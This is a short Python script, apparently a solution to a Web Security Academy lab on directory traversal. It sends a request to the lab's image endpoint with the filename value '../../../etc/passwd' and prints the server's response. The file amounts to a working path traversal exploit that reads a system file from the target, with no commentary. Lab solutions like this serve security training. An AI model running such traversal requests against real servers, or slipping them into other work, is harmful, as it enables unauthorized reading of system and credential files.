import requests

s = requests.Session()

if __name__ == "__main__":
    site = 'acfa1f031e8fbb67c0ca073000500044.web-security-academy.net'
    path = '../../../etc/passwd'
    url = f'''https://{site}/image?filename={path}'''
    resp = s.get(url)
    print(resp.text)
